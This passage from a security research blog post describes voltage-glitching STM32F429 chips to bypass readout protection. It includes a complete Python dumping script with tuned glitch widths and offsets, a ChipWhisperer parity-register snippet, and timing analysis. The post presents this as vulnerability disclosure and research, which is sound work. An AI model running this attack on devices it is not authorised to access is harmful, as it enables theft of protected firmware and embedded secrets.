the activation command (0x7F) must be sent. After that, we can use the GET_ID command (0x02) to check for proper activation, which should return an ACK (0x79) and the PID (here 0x429). Knowing that we properly activated the bootloader, we can now execute the interesting READ_MEMORY command (0x11) which must be followed by four address bytes (e.g., 0x80000000) and the number of bytes to be read (0xFF), each one acknowledged by receiving ACK (0x79).</p><p>Using our SECGlitcher, the dumping script is fairly easy. We evaluated, that the bootloader glitches with a glitch width between 23 and 24. The offset of our trigger byte (the UART transmission of 0x11) equals 9050 to 9150 cycles. This is now implemented as "bl_mem" configuration of our glitcher.</p><p><strong>glitch_bootloader_to_download.py</strong></p><pre><code class="language-python">from SECGlitcher import SECGlitcher
import time
import signal
import hexdump
from spd3303x import SPD3303X
from stm32bootloader import STM32SerialBootloader
 
 
def power_cycle():
    with SPD3303X.ethernet_device("x.x.x.x") as dev:
        dev.CH1.set_output(False)
        time.sleep(0.1)
        dev.CH1.set_output(True)
        time.sleep(0.5)
 
 
def int_handler(signum, frame):
    global glitcher
    glitcher.exit()
    glitcher.print_results()
    glitcher.save_results()
 
 
signal.signal(signal.SIGINT, int_handler)
 
 
class MyGlitcher(SECGlitcher):
    def __init__(self, dump_addr, dump_len, dump_filename, reset_pin='nrst'):
        super().__init__(reset_pin)
        self.current_dump_addr = dump_addr
        self.current_dump_len = dump_len
        self.dump_filename = dump_filename
        self.uart = None
 
    def dut_uart_init_before_reset(self):
        time.sleep(0.1)
 
    def dut_uart_init_after_reset(self):
        time.sleep(0.1)
        try:
            self.uart = STM32SerialBootloader("/dev/ttyACM1", baud=115200)
            self.uart.cmd_get_id()
        except ValueError:
            print("Bootloader not Activated properly! Something is wrong!")
            self.scope.io.nrst = "low"
            power_cycle()
            time.sleep(0.1)
            return False
        print("Bootloader available")
        return True
 
    def dut_uart_write(self):
        self.uart.cmd_read_memory_part1()
        print("Using width: {} Offset: {} Success: {}".format(self.current_width, self.current_offset, len(self.success_params)))
 
    def check_glitch(self):
        state = self.uart.cmd_read_memory_part2()
        if state == 0:
            try:
                len_to_dump = 256 if (self.current_dump_len // 256) else self.current_dump_len % 256
                data = self.uart.cmd_read_memory_part3(self.current_dump_addr, len_to_dump)
                #print(data)
                if len(data) == len_to_dump:
                    if data != b"\x79" * len_to_dump:
                        with open(self.dump_filename, 'ab+') as f:
                            f.write(data)
                        self.current_dump_addr += len_to_dump
                        self.current_dump_len -= len_to_dump
                        print("Dumped using width: {} offset: {} success: {}".format(self.current_width,
                                                                                     self.current_offset,
                                                                                     len(self.success_params)))
                        print("Dumped 0x{:x} bytes from addr 0x{:x}, {:x} bytes left".format(len_to_dump,
                                                                                             self.current_dump_addr,
                                                                                             self.current_dump_len))
                else:
                    print("Missing some data, but got")
                    hexdump.hexdump(data)
                self.add_success()
            except Exception as e:
                print(e)
                print("Nothing read")
 
 
glitcher = MyGlitcher(0x0800_0000, 0x200000, dump_filename="dumped_firmware.bin")
glitcher.trigger_setup(trigger='uart', parity='even', uart_pattern=[0x11])
glitcher.print_config()
 
power_cycle()
while glitcher.current_dump_len &gt; 0:
    glitcher.run(target="stm32f429", app="bl_mem")
 
glitcher.exit()
glitcher.print_results()
glitcher.save_results()
glitcher.plot_results()</code></pre><p>&nbsp;</p></div></section><section class="section section__textpic"><div id="c4727" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_8_Glitched_MEMORY_READ_command_on_STM32F429ZI_Logo.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/d/0/csm_Figure_8_Glitched_MEMORY_READ_command_on_STM32F429ZI_Logo_51f9329291.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/d/0/csm_Figure_8_Glitched_MEMORY_READ_command_on_STM32F429ZI_Logo_33cf3c00a3.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/d/0/csm_Figure_8_Glitched_MEMORY_READ_command_on_STM32F429ZI_Logo_218fd2ea35.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/d/0/csm_Figure_8_Glitched_MEMORY_READ_command_on_STM32F429ZI_Logo_20ef16aad5.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_8_Glitched_MEMORY_READ_command_on_STM32F429ZI_Logo.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_8_Glitched_MEMORY_READ_command_on_STM32F429ZI_Logo.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/d/0/csm_Figure_8_Glitched_MEMORY_READ_command_on_STM32F429ZI_Logo_1b7b7fec51.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/d/0/csm_Figure_8_Glitched_MEMORY_READ_command_on_STM32F429ZI_Logo_9a7004b097.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_8_Glitched_MEMORY_READ_command_on_STM32F429ZI_Logo.png" width="800" height="526" alt="Glitched MEMORY_READ command on STM32F429ZI" /></picture></a><figcaption class="image-caption">
            Figure 8: Glitched MEMORY_READ command on STM32F429ZI
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p>A working glitch is shown in the next figure 8. Notice the end of the decoded UART transmission of 0xEE (checksum of 0x11) as channel S1 at the bottom.</p></div></div></div></section><section class="section section__textpic"><div id="c4728" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_9_Recovered_sample_program_firmware_from_STM32F429ZI_Logo.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/4/d/csm_Figure_9_Recovered_sample_program_firmware_from_STM32F429ZI_Logo_83d37efb31.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/d/csm_Figure_9_Recovered_sample_program_firmware_from_STM32F429ZI_Logo_ce4bd32a2f.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/d/csm_Figure_9_Recovered_sample_program_firmware_from_STM32F429ZI_Logo_5a2265a162.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/d/csm_Figure_9_Recovered_sample_program_firmware_from_STM32F429ZI_Logo_e056893acd.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_9_Recovered_sample_program_firmware_from_STM32F429ZI_Logo.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_9_Recovered_sample_program_firmware_from_STM32F429ZI_Logo.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_9_Recovered_sample_program_firmware_from_STM32F429ZI_Logo.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/d/csm_Figure_9_Recovered_sample_program_firmware_from_STM32F429ZI_Logo_58835b406a.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_9_Recovered_sample_program_firmware_from_STM32F429ZI_Logo.png" width="708" height="190" alt="Recovered sample program firmware from STM32F429ZI" /></picture></a><figcaption class="image-caption">
            Figure 9: Recovered sample program firmware from STM32F429ZI
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p>Running the script over night resulted in 622 successful glitches and thus roughly 155kB of protected firmware. Examining the "dumped_firmware.bin file results in the disclosure of the secret password "MySecretPasswordString", as shown in figure 9:</p></div></div></div></section><section class="section section__text"><div id="c4729" class="frame frame-default frame-type-text frame-layout-0"><h2>Conclusion</h2><p>At the beginning of this project, we decided it would be fun to glitch some STM32 microcontrollers, as we would encounter them frequently in all sorts of IoT devices. We would have never imagined how far down the rabbit hole we would have to go.&nbsp;</p><p>During our initial research of papers about STM32 glitching, we found some other companies that pulled it off before. However, nobody was posting their parameters or details about the how. That's why we decided to create the SECGlitcher class. It's supposed to store rough timing areas for boards and MCUs, so that only a small space has to be searched. Further, it handles initialization and some generic trigger setups to keep the code base small and tidy.&nbsp; Using our class, we were able to showcase some successful glitches, including the skipping of a password check via a UART command line and reading memory via the bootloader of an locked STM32.&nbsp;</p><p>However, we also ran into some unexpected obstacles, that no one else mentioned in their blogposts or papers yet. We are unsure, if this behavior is solely due to the choice of STM32 model. While this behavior slows down the process of extracting the whole flash of an STM32, it does not change the underlying vulnerability. We are still able to read all contents from a locked device.&nbsp;</p><p>With our experiments we were able to show that the STM32 series of microcontrollers must be seen as insecure, even if readout protection measures are active. An attacker is able to skip instructions and thus bypass checks, which can be turned into a leak of the full firmware. The SECGlitcher class significantly improved the usability of glitching attacks in our day to day projects, as it is faster and simpler to setup and improves results.</p><p>Stay tuned for part two of our glitching series, where we will glitch a STM32 from RDP2 to RDP1 and then dump its contents.&nbsp;</p></div></section><section class="section section__text"><div id="c4730" class="frame frame-default frame-type-text frame-layout-0"><h2>Appendix: Setting Even Parity for UART on ChipWhisperer (Tech Deep Dive)</h2><p>The STM32 bootloader uses UART communication with an even parity bit, as described in the&nbsp;<a href="https://www.st.com/resource/en/application_note/cd00264342-usart-protocol-used-in-the-stm32-bootloader-stmicroelectronics.pdf" target="_blank" rel="noreferrer">AN3155 Application Note</a>. This turned out to be a major challenge for using the ChipWhisperer for this work, as the ChipWhisperer does not officially support any parity bit for its UART interface. This was also recently mentioned in a&nbsp;<a href="https://circuitcellar.com/research-design-hub/basics-of-design/revisiting-code-readout-protection-claims/" target="_blank" rel="noreferrer">article</a>&nbsp;by the creator of the ChipWhisperer, Colin O'Flynn itself, where he noted that "custom bitstream for the ChipWhisperer-Pro is needed due to the even parity requirement of the bootloader". Our work started before this article was published, and back then we found a different solution to this problem. It is true that the ChipWhisperer does not&nbsp;<em>officially</em>&nbsp;support parity bits, however, at least even parity is supported in the FPGA implementation since April 2021. So there was no need for a custom bitstream for us. We only had to find out how to use it.</p><p>The corresponding&nbsp;<a href="https://github.com/newaetech/chipwhisperer/commit/3a5a32cee176d4b9203e15f77638eb6eee6b2491" target="_blank" rel="noreferrer">Github issue</a>&nbsp;from April 2021 shows that some UART configuration registers were exposed to the interface to be used by Python. The UART implementation "targ_async_receiver" is instantiated in the&nbsp;<a href="https://github.com/newaetech/chipwhisperer/blob/3a5a32cee176d4b9203e15f77638eb6eee6b2491/hardware/common/hdl/io_decode_trigger/reg_decodeiotrigger.v#L198" target="_blank" rel="noreferrer">"reg_decodeiotrigger" line 198</a>, where the IO registers are parsed. Here, byte 2 of "reg_trig_cfg" is set as "module_specific", and the "even_parity" bit turned out to be the first bit of this byte. Therefore, we are happy to present you the solution to set the even parity bit mode on the ChipWhisperer UART below, where the even parity bit gets set.</p><pre><code>CODE_READ = 0x80
CODE_WRITE = 0xC0
ADDR_DECODECFG = 57
ADDR_DECODEDATA = 58
data = self.scope.decode_IO.oa.sendMessage(CODE_READ, ADDR_DECODECFG, Validate=False, maxResp=8)
data[1] = data[1] | 0x01
self.scope.decode_IO.oa.sendMessage(CODE_WRITE, ADDR_DECODECFG, data)</code></pre><p>This code is also implemented in the SECGlitcher class.</p></div></section><section class="section section__textpic"><div id="c4731" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_10_STM32_bootloader_with_quick_answer_Logo.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/d/7/csm_Figure_10_STM32_bootloader_with_quick_answer_Logo_22667c67b6.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/d/7/csm_Figure_10_STM32_bootloader_with_quick_answer_Logo_59df351300.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/d/7/csm_Figure_10_STM32_bootloader_with_quick_answer_Logo_703521bffe.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/d/7/csm_Figure_10_STM32_bootloader_with_quick_answer_Logo_b061fe9573.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_10_STM32_bootloader_with_quick_answer_Logo.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_10_STM32_bootloader_with_quick_answer_Logo.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/d/7/csm_Figure_10_STM32_bootloader_with_quick_answer_Logo_d82c43e674.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/d/7/csm_Figure_10_STM32_bootloader_with_quick_answer_Logo_552533fe4a.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_10_STM32_bootloader_with_quick_answer_Logo.png" width="801" height="520" alt="STM32 bootloader with quick answer" /></picture></a><figcaption class="image-caption">
            Figure 10: STM32 bootloader with quick answer
        </figcaption></figure><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_11_STM32_bootloader_with_delayed_answer_Logo.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/e/4/csm_Figure_11_STM32_bootloader_with_delayed_answer_Logo_262c07a853.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/e/4/csm_Figure_11_STM32_bootloader_with_delayed_answer_Logo_a74533f691.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/e/4/csm_Figure_11_STM32_bootloader_with_delayed_answer_Logo_5d15f9ebb3.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/e/4/csm_Figure_11_STM32_bootloader_with_delayed_answer_Logo_78ec9f92a3.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_11_STM32_bootloader_with_delayed_answer_Logo.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_11_STM32_bootloader_with_delayed_answer_Logo.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/e/4/csm_Figure_11_STM32_bootloader_with_delayed_answer_Logo_cb0525b5f8.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/e/4/csm_Figure_11_STM32_bootloader_with_delayed_answer_Logo_f422995279.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_11_STM32_bootloader_with_delayed_answer_Logo.png" width="803" height="519" alt="STM32 bootloader with delayed answer" /></picture></a><figcaption class="image-caption">
            Figure 11: STM32 bootloader with delayed answer
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><h2>Appendix: The Story of the Inconsistent Timing (Tech Deep Dive)</h2><p>While trying to execute the glitch for reading the memory, we made a seemingly odd observation: Sometimes, the value in the RDP register (which controls the lock state) changed to 0x55 and sometimes also the SPRMOD register (a special feature for write protection in this STM32 model) changed to 0x01 - but why? We never write to the register in our executed path. We came to the conclusion that most likely we are glitching on a different bootloader path. Further inspection assured us in this guess, as we made another odd observation: The UART response was not constant but shifting around randomly in a pretty big timeframe window. This is shown in the next two figures (10 &amp; 11), where a difference in up to 8us can be observed (S1 shows the decoded UART communication). As we glitch on a fixed offset from the command, it seems that in reality, we are glitching in an extremely in-deterministic way.</p></div></div></div></section><section class="section section__textpic"><div id="c4732" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/_processed_/b/f/csm_Figure_12_USART_implementation_block_diagram_6145ae1548.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/b/f/csm_Figure_12_USART_implementation_block_diagram_de5e528d7c.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/b/f/csm_Figure_12_USART_implementation_block_diagram_1a61b6bbda.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/b/f/csm_Figure_12_USART_implementation_block_diagram_767859616f.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/b/f/csm_Figure_12_USART_implementation_block_diagram_b6779c0ed0.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_12_USART_implementation_block_diagram.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_12_USART_implementation_block_diagram.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/b/f/csm_Figure_12_USART_implementation_block_diagram_6953b62ee8.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/b/f/csm_Figure_12_USART_implementation_block_diagram_b9f0bd7790.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_12_USART_implementation_block_diagram.png" width="842" height="902" alt="USART implementation block diagram (Source: RM0090 Figure 296)" /></picture></a><figcaption class="image-caption">
            Figure 12: USART implementation block diagram (Source: RM0090 Figure 296)
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p>After ruling out several other seemingly possible causes, we examined the different clock domains of the UART hardware and the chip itself. The UART supports a maximum baud rate of 115200, which is still slow compared to the 60MHz that the core is running at during bootloader execution. An overview of the implemented UART hardware is given below in figure 12.</p></div></div></div></section><section class="section section__textpic"><div id="c4733" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_13_14_Scatter_plot_and_distribution_Logo.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/4/8/csm_Figure_13_14_Scatter_plot_and_distribution_Logo_fdcdb5ea27.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/8/csm_Figure_13_14_Scatter_plot_and_distribution_Logo_9e22f9ef47.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/8/csm_Figure_13_14_Scatter_plot_and_distribution_Logo_084d42e67e.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/8/csm_Figure_13_14_Scatter_plot_and_distribution_Logo_0665baf199.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/4/8/csm_Figure_13_14_Scatter_plot_and_distribution_Logo_3755489cfe.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/8/csm_Figure_13_14_Scatter_plot_and_distribution_Logo_da7e06172a.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/8/csm_Figure_13_14_Scatter_plot_and_distribution_Logo_eb3bfc0117.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/8/csm_Figure_13_14_Scatter_plot_and_distribution_Logo_4acc0e01c9.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/4/8/csm_Figure_13_14_Scatter_plot_and_distribution_Logo_e8239a898a.png" width="1100" height="461" alt="Scatter plot and distribution of UART response timing for baudrate 9600" /></picture></a><figcaption class="image-caption">
            Figure 13+14: Scatter plot and distribution of UART response timing for baudrate 9600
        </figcaption></figure><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_15_16_Scatter_plot_and_distribution_Logo.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/a/7/csm_Figure_15_16_Scatter_plot_and_distribution_Logo_8037e21ea9.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/a/7/csm_Figure_15_16_Scatter_plot_and_distribution_Logo_c54b7e90da.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/a/7/csm_Figure_15_16_Scatter_plot_and_distribution_Logo_e5b4071bce.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/a/7/csm_Figure_15_16_Scatter_plot_and_distribution_Logo_347e72f50f.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/a/7/csm_Figure_15_16_Scatter_plot_and_distribution_Logo_d5187f229f.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/a/7/csm_Figure_15_16_Scatter_plot_and_distribution_Logo_15ee291e64.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/a/7/csm_Figure_15_16_Scatter_plot_and_distribution_Logo_919ccb0345.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/a/7/csm_Figure_15_16_Scatter_plot_and_distribution_Logo_0b2a169776.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/a/7/csm_Figure_15_16_Scatter_plot_and_distribution_Logo_9392874a54.png" width="1100" height="470" alt="Scatter plot and distribution of UART response timing for baudrate 115200" /></picture></a><figcaption class="image-caption">
            Figure 15+16: Scatter plot and distribution of UART response timing for baudrate 115200
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p>From the bottom of figure 12, we see that the core clock f<sub>PCLKx</sub>&nbsp;is modified by a USARTDIV divider (based on the baudrate) and an additional sampling divider before it is used as transmitter and receiver clock. This means the hardware will run significantly slower than the internal core. All data that is sent and received via UART must cross from the slow to the fast clock domain (or vice versa). To validate our observation, we decided to do a simple statistical analysis on the answer delay using different baudrates. If the average delay correlates with the baudrate, the delay is caused by the slow UART clock domain.</p><p>Multiple plots were created for 1000 executions, the ones for the fastest and slowest baudrate checked are shown below in figure 13 and 14:</p></div></div></div></section><section class="section section__textpic"><div id="c4734" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_17_STM32_bootloader_activation_sequence.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/d/c/csm_Figure_17_STM32_bootloader_activation_sequence_422121974e.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/d/c/csm_Figure_17_STM32_bootloader_activation_sequence_44939119f0.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/d/c/csm_Figure_17_STM32_bootloader_activation_sequence_551197c2ac.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/d/c/csm_Figure_17_STM32_bootloader_activation_sequence_59525c9be9.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_17_STM32_bootloader_activation_sequence.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_17_STM32_bootloader_activation_sequence.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_17_STM32_bootloader_activation_sequence.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_17_STM32_bootloader_activation_sequence.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_17_STM32_bootloader_activation_sequence.png" width="460" height="374" alt="STM32 bootloader activation sequence (Source: AN3155 Figure 1)" /></picture></a><figcaption class="image-caption">
            Figure 17: STM32 bootloader activation sequence (Source: AN3155 Figure 1)
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p>The plots show a huge change in delay for the different baudrates (with a ratio of 12:1).</p><p>Statistics for baudrate 9600</p><ul class="list-normal"><li>Min. delay: 59.012us</li><li>Max. delay: 163.130us</li><li>Avg. delay: 104.118us</li></ul><p>Statistics for baudrate 115200</p><ul class="list-normal"><li>Min. delay: 4.400us</li><li>Max. delay: 15.628us</li><li>Avg. delay: 11.228us</li></ul><p>When we take a look at the average delay, it has a ratio of roughly 9.3:1. If we assume a fixed base-delay (due to processing and calculating the answer), this aligns quite well with our assumption. It seems that the delay due to the slow clocking of the UART hardware is an inherent obstacle here for efficient glitching and may lead to unintended side effects due to shifted execution parameters. However, the effects may be mitigated by using only the shortest feasible glitch delay parameters (as the functions responsible for some unintended side effects are located after the MEMORY_READ command).</p><h2>Appendix: The STM32 Bootloader</h2><p>Her we will summarize the important parts of the bootloader protocol documented in&nbsp;<a href="https://www.st.com/resource/en/application_note/an3155-usart-protocol-used-in-the-stm32-bootloader-stmicroelectronics.pdf" target="_blank" rel="noreferrer">AN3155</a>. The following flowchart (figure 17) shows the activation sequence of the bootloader:</p></div></div></div></section><section class="section section__textpic"><div id="c4735" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_18_GET_ID_command_sequence.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/4/d/csm_Figure_18_GET_ID_command_sequence_741f3bb21c.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/d/csm_Figure_18_GET_ID_command_sequence_96dd00c030.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/d/csm_Figure_18_GET_ID_command_sequence_8277bfd99a.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/d/csm_Figure_18_GET_ID_command_sequence_61af986bb1.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_18_GET_ID_command_sequence.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_18_GET_ID_command_sequence.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_18_GET_ID_command_sequence.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_18_GET_ID_command_sequence.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_18_GET_ID_command_sequence.png" width="290" height="430" alt="GET_ID command sequence (Source: AN3155 Figure 6)" /></picture></a><figcaption class="image-caption">
            Figure 18: GET_ID command sequence (Source: AN3155 Figure 6)
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p>Therefore, initially, we have to transmit 0x7F to activate the UART bootloader loop. The GET_ID command to check the proper activation is implemented as follows (figure 18):</p></div></div></div></section><section class="section section__textpic"><div id="c4736" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_19_Figure_20_READ_MEMORY_command_sequence.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/4/b/csm_Figure_19_Figure_20_READ_MEMORY_command_sequence_53975e0e17.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/b/csm_Figure_19_Figure_20_READ_MEMORY_command_sequence_8f082bc823.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/b/csm_Figure_19_Figure_20_READ_MEMORY_command_sequence_c2365b72cc.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/b/csm_Figure_19_Figure_20_READ_MEMORY_command_sequence_138bdd6ce4.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_19_Figure_20_READ_MEMORY_command_sequence.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_19_Figure_20_READ_MEMORY_command_sequence.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/b/csm_Figure_19_Figure_20_READ_MEMORY_command_sequence_f474525b7e.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/b/csm_Figure_19_Figure_20_READ_MEMORY_command_sequence_50fcfc263a.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_19_Figure_20_READ_MEMORY_command_sequence.png" width="872" height="720" alt="READ_MEMORY command sequence for host (Source figure 19: AN3155 Figure 8) and device (Source figure 20: AN3155 Figure 9)" /></picture></a><figcaption class="image-caption">
